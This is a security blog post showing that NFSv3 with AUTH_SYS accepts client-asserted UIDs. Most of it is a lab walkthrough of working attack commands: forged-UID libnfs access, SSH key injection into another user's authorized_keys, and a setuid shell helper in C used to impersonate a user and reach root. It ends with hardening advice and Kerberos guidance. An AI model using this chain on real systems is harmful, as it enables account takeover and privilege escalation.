---
title: "NFSv3: Open Says Me, No Sesame Required"
date: 2026-06-16
draft: false
ShowToc: false
tags:
  - linux
  - nfs
  - security
  - sysadmin
  - kerberos
  - hardening
description: >
  NFSv3 with AUTH_SYS trusts whatever UID and GID the client claims. Where it
  serves home directories, an unprivileged user can become any other user: read
  their files, write to public SSH keys and shell rc files, and create SUID
  binaries owned by other users for user impersonation and potentially root
  escalation. In environments where home directories are centrally exported
  and mounted across many hosts, one foothold can become lateral movement
  across large portions of the infrastructure.
---

This is not a new problem. There is nothing to patch, because none of it is a defect in the usual sense. It is the documented, intended behavior of a protocol that a surprising amount of infrastructure still runs today, very often underneath home directories.

I first ran this audit a few years ago against a large Linux infrastructure running CentOS 7, and recently set out to document it. Reproducing it on a modern Ubuntu 22.04 client took one detour, which I will explain shortly. The result is the same as it has always been: NFSv3 with `AUTH_SYS` does not authenticate anyone. It takes the client at its word.

This post walks the whole chain: reading another user's files, writing as them, spawning a shell as them, escalating to root, and then covering how to mitigate it.

---

## How NFSv3 Authenticates

It doesn't.

By default, NFSv3 uses `AUTH_SYS` (historically `AUTH_UNIX`). Although Kerberos authentication is supported via RPCSEC_GSS, the default out of the box is `AUTH_SYS`, and that is what historically the overwhelming majority of deployments run. Every RPC call carries a credential containing a UID, a primary GID, and a list of supplementary GIDs. The client fills those values in, and the server believes them.

There is no password, no ticket, no challenge, and no key. The only thing standing between an attacker and a given UID is the ability to write that number into the RPC credential. A normal kernel mount requires root on the client, and from then on the kernel fills each request's credential with the calling process's own UID and GID. That requirement does a lot of quiet, load-bearing work, and people mistake it for security. It is not security, and it is not even much of a barrier.

Two facts remove even that:

1. A userspace NFS client needs no kernel mount, so it needs no root, and nothing forces it to send a real UID. It builds the credential by hand.
2. `root_squash`, the one protection most admins can name, only squashes the root account (UID 0). It does nothing to UID 2000, or to any other non-root UID.

Put those together and any user who can reach the NFS server can read and write files as any non-root UID on the export. On a plain data share that is bad enough. When the export holds home directories, reading and writing as a UID becomes *being* that user, on every host that mounts it.

---

## Lab setup

Two hosts, flat lab network.

```
172.22.22.32  nfs.lab.opscode.io       # NFS server, exports /export
172.22.22.31  target.lab.opscode.io    # client, mounts /export/home
```

`target` mounts home directories from `nfs`, the familiar "log in anywhere, your home follows you" pattern. Two users:

```
bob:x:2000:2000::/export/home/bob:/bin/bash
mallory:x:2001:2001::/export/home/mallory:/bin/bash
```

`mallory` is the attacker: a plain, unprivileged user, with no sudo and nothing special.

```
mallory@target:~$ id
uid=2001(mallory) gid=2001(mallory) groups=2001(mallory)
```

`bob`'s home directory is locked down exactly the way you would expect:

```
mallory@target:~$ ls -lad /export/home/bob
drwx------ 3 bob bob 4096 Jun 16 19:00 /export/home/bob
mallory@target:~$ ls -la /export/home/bob
ls: cannot open directory '/export/home/bob': Permission denied
```

Local POSIX permissions work exactly as expected. The directory is `0700`, owned by bob, and mallory is denied. This is the protection everyone trusts. Watch it evaporate.

### The tool

The attack tool is [libnfs](https://github.com/sahlberg/libnfs) and its `ld_nfs.so` shared library, loaded via `LD_PRELOAD`. It hooks standard glibc functions — `open`, `read`, `write`, `chmod`, `chown`, `fchmod`, `fchown`, the `__xstat` family of stat variants, and related functions — by resolving the real glibc implementations via `dlsym(RTLD_NEXT, ...)` at startup and replacing them with wrappers. When a wrapper detects a path beginning with `nfs://`, it bypasses the kernel's NFS client entirely and opens a direct userspace TCP connection to the NFS server via libnfs, without any local kernel NFS mount permission check.

Before issuing any RPC, the library calls `nfs_set_uid()` and `nfs_set_gid()` on the libnfs context with the values from `LD_NFS_UID` and `LD_NFS_GID`. Internally, those calls flow through to `libnfs_authunix_create()`, which constructs an `AUTH_UNIX` (`AUTH_SYS`) credential and packs the UID and GID values into its opaque body. That credential is attached to the RPC context and sent with all subsequent NFS protocol operations made through that context. The server reads the UID and GID out of the credential and makes all access control decisions based on them.

```bash
sudo apt update && sudo apt install -y autoconf automake libtool libkrb5-dev build-essential

git clone https://github.com/sahlberg/libnfs.git
cd libnfs/
./bootstrap
./configure --prefix=$HOME/libnfs-install
make -j$(nproc)
make install
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include -L$HOME/libnfs-install/lib

export LD_LIBRARY_PATH=$HOME/libnfs-install/lib PATH=$HOME/libnfs-install/bin:$PATH
```

### A note on reproducing this on modern glibc

The `ld_nfs.so` library was written against an older glibc. On modern Linux, glibc and coreutils route certain filesystem operations through internal function paths the original LD_PRELOAD hooks did not cover. Those calls bypass the hooks and act on the local filesystem instead of the NFS target, so the library does not function correctly on current systems. Getting it to function properly on modern Linux with a newer glibc meant extending the hooks to cover those paths.

---

## Reading another user's files

mallory cannot read bob's home directory as mallory, so the request does not go out as mallory. It goes straight to the NFS server, claiming to be UID 2000:

```
mallory@target:~$ nfs-ls "nfs://172.22.22.32/export/home/bob/?uid=2000&gid=2000"
-rw-r--r--  1  2000  2000         3771 .bashrc
-rw-------  1  2000  2000           17 .bash_history
drwx------  2  2000  2000         4096 .cache
-rw-r--r--  1  2000  2000          807 .profile
```

The `0700` directory and the `0600` history file are both wide open. The server ran its permission check against the UID the client asserted, and the client asserted bob.

This isn't good, and it gets a lot worse.

---

## Writing as another user

bob has an empty `authorized_keys`:

```
mallory@target:~$ nfs-ls "nfs://172.22.22.32/export/home/bob/.ssh/?uid=2000&gid=2000"
-rw-------  1  2000  2000            6 authorized_keys
```

If mallory can read as bob, mallory can write as bob. The attacker writes a chosen public key into the file:

```
mallory@target:~$ LD_NFS_UID=2000 LD_NFS_GID=2000 LD_PRELOAD=~/libnfs/ld_nfs.so \
  cp attacker_pub_ssh_key nfs://172.22.22.32/export/home/bob/.ssh/authorized_keys

mallory@target:~$ nfs-cat "nfs://172.22.22.32/export/home/bob/.ssh/authorized_keys?uid=2000&gid=2000"
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO4V6b6N5w7GxN2mY6rLz7Tt1JvQeF9XWmJQ3q8YxPzD mallory@attacker
```

That is the entire attack against home directories, in three lines. mallory now has SSH access as bob, and not only on `target`. The same key is valid on every host that mounts that home directory.

The same write primitive reaches the shell startup files too. A malicious payload backdoored into bob's `.bashrc` or `.profile` runs as bob at every subsequent login on any of those hosts, which is a straightforward path to a persistent reverse shell.

When NFSv3 home directories are the single source of truth across the infrastructure, compromising the export on one Linux host means bob's account is compromised everywhere his home directory follows. This allows for lateral movement across the environment, and it is exactly why NFSv3 home directories make the problem so much worse than an isolated data share.

---

## Local impersonation via SUID binary

SSH key injection assumes the target account can log in. Suppose instead you want code execution as bob on the box right now. Because ownership and mode changes are authorized based on the forged UID, an attacker can create files owned by another user and set the SUID bit where client mount options permit it.

This attack depends on the client mount not having `nosuid` set. In the lab, the share is mounted without it, which is common in environments that predate the habit of hardening mount options. If `nosuid` is present on the client mount, the kernel ignores the SUID bit on that filesystem and this path does not work.

A trivial setuid helper:

```c
#include <unistd.h>
#include <stdio.h>

int main(void) {
    printf("ruid=%d euid=%d rgid=%d egid=%d\n",
           getuid(), geteuid(), getgid(), getegid());

    setreuid(geteuid(), geteuid());
    setregid(getegid(), getegid());

    execl("/bin/sh", "sh", "-p", NULL);
    perror("execl");
    return 1;
}
```

Compile it:

```
mallory@target:~$ gcc -o shell shell.c
```

mallory writes the binary into a path owned by bob, impersonating bob to do it, then sets the SUID bit, again as bob:

```
mallory@target:~$ LD_NFS_UID=2000 LD_NFS_GID=2000 LD_PRELOAD=~/libnfs/ld_nfs.so \
  cp nfs://172.22.22.32/export/home/mallory/shell nfs://172.22.22.32/export/home/mallory/bobs-shell
mallory@target:~$ ls -lah bobs-shell
-rwxrwxr-x 1 bob bob 16K Jun 17 01:20 bobs-shell

mallory@target:~$ LD_NFS_UID=2000 LD_NFS_GID=2000 LD_PRELOAD=~/libnfs/ld_nfs.so \
  chmod +s nfs://172.22.22.32/export/home/mallory/bobs-shell
mallory@target:~$ ls -la bobs-shell
-rwsrwsr-x 1 bob bob 16312 Jun 17 01:20 bobs-shell
```

A SUID binary owned by bob, sitting on a share that is mounted completely normally. mallory is still mallory:

```
mallory@target:~$ id
uid=2001(mallory) gid=2001(mallory) groups=2001(mallory)
mallory@target:~$ ./bobs-shell
ruid=2001 euid=2000 rgid=2001 egid=2000
$ id
uid=2000(bob) gid=2000(bob) groups=2000(bob),2001(mallory)
```

A shell as bob. The SSH key gave lateral movement; this gives local impersonation. Take whichever fits the objective.

---

## When `no_root_squash` is set: straight to root

Everything so far worked as one non-root user impersonating another, which is the whole point: `root_squash` does nothing to stop it. By default, `root_squash` maps a client's UID 0 down to the unprivileged `nobody` account, so a forged root credential gets you nothing. `no_root_squash` disables that and treats a client's UID 0 as real root on the export.

Where `no_root_squash` is enabled, forged UID 0 credentials allow the attacker to perform server-side operations as root on the export. In environments that execute files from the mounted share and permit SUID execution, this can be leveraged into local root access:

```
mallory@target:~$ LD_NFS_UID=0 LD_NFS_GID=0 LD_PRELOAD=~/libnfs/ld_nfs.so \
  cp nfs://172.22.22.32/export/home/mallory/shell nfs://172.22.22.32/export/home/mallory/root-shell
mallory@target:~$ ls -la root-shell
-rwxrwxr-x 1 root root 16312 Jun 17 01:27 root-shell

mallory@target:~$ LD_NFS_UID=0 LD_NFS_GID=0 LD_PRELOAD=~/libnfs/ld_nfs.so \
  chmod +s nfs://172.22.22.32/export/home/mallory/root-shell
mallory@target:~$ ls -la root-shell
-rwsrwsr-x 1 root root 16312 Jun 17 01:27 root-shell

mallory@target:~$ id
uid=2001(mallory) gid=2001(mallory) groups=2001(mallory)
mallory@target:~$ ./root-shell
ruid=2001 euid=0 rgid=2001 egid=0
# id
uid=0(root) gid=0(root) groups=0(root),2001(mallory)
```

Local privilege escalation to root, from an unprivileged account, with no exploit and no memory corruption. Just a protocol doing exactly what it was designed to do.

---

## Why this is a lateral movement problem, not a network storage problem

A standalone data share that gets compromised is a contained incident. NFSv3 home directories are not. The home directory *is* the identity: it holds `authorized_keys`, shell startup files, credential caches, and dotfiles that other tooling trusts, all mounted across every host in the infrastructure. Assert one user's UID against the server and you can read that user's secrets, overwrite their SSH keys for persistent access, backdoor their startup files, or create SUID binaries — across every host simultaneously. If `no_root_squash` is set anywhere, that same impersonation potentially escalates to root on any host that mounts the export.

A single unprivileged account on a single host with network access to an NFSv3 server is all it takes to move laterally across an entire infrastructure. Being able to impersonate `bob` on one host is enough to compromise every host bob can reach.

---

## Partial mitigations, if you are stuck on NFSv3

Without Kerberos, the server-side options reduce the blast radius but leave the core identity-spoofing problem intact:

- Keep `root_squash` on and never set `no_root_squash`. This neutralizes the root escalation path shown above and nothing else.
- Keep `secure` on. It requires source ports below 1024, which raises the bar for unprivileged userspace clients. An attacker with root on any client can still forge any UID.
- For non-home-directory data shares, `all_squash` with a fixed `anonuid`/`anongid` removes per-user impersonation entirely by mapping all clients to one anonymous identity.

On every client, mount NFS shares with `nosuid`, `noexec`, and `nodev`. The mount option `nosuid` removes the SUID binary escalation path; `noexec` prevents binaries from running off the share at all.

Even with everything above applied, `sec=sys` leaves non-root identity spoofing fully intact. Only Kerberos completely mitigates the issue.

---

## The actual fix

Stop authenticating on the honor system.

NFSv4 with Kerberos replaces "trust the UID in the RPC call" with a ticket the user has to actually hold:

- `sec=krb5` authenticates the user through Kerberos. The server verifies a real ticket instead of believing a number. mallory cannot become bob without bob's ticket.
- `sec=krb5i` adds integrity protection, so requests cannot be tampered with in transit.
- `sec=krb5p` adds privacy on top of integrity, encrypting the traffic on the wire.

NFSv4 is where Kerberos is best supported and most straightforward to configure. The NFSv4 protocol specification mandates that every conforming implementation must support Kerberos via RPCSEC_GSS, so the infrastructure is always there — you are enabling something the protocol requires, not bolting something on. Neither NFSv3 nor NFSv4 uses Kerberos by default on Linux; both default to `AUTH_SYS` unless explicitly configured. The difference is that on NFSv4 the Kerberos integration is a first-class part of the protocol with a single port and built-in security negotiation. If you must stay on NFSv3 but can implement Kerberos, RPCSEC_GSS with `sec=krb5p` achieves the same result — the server verifies a real ticket rather than trusting a client-supplied UID — though on NFSv3 it requires manually configuring the additional services that NFSv4 handles internally.

Worth noting: Kerberos is not without its own risks. User credential caches live on client hosts, not on the NFS server. An attacker who gains root on any Linux host that mounts the share can extract TGTs from those ccaches and use them to request service tickets for any Kerberos-enabled service in the realm, or directly replay already-cached service tickets to authenticate as that user across the environment. Hardening Kerberos on Linux is its own topic and I will cover it in a separate post.

### The short version, in priority order

1. **Do not use NFSv3.** Move to NFSv4 with Kerberos (`sec=krb5p` recommended).
2. **If you must stay on NFSv3 and can implement Kerberos:** enable RPCSEC_GSS with `sec=krb5p`. This fully closes the identity-spoofing hole, at the cost of considerably more manual configuration than on NFSv4.
3. **If you must use NFSv3 without Kerberos:** keep `root_squash`, never `no_root_squash`, keep `secure`, and mount every client `nosuid,noexec,nodev`. Accept that non-root identity spoofing still works and treat the data on those exports accordingly.
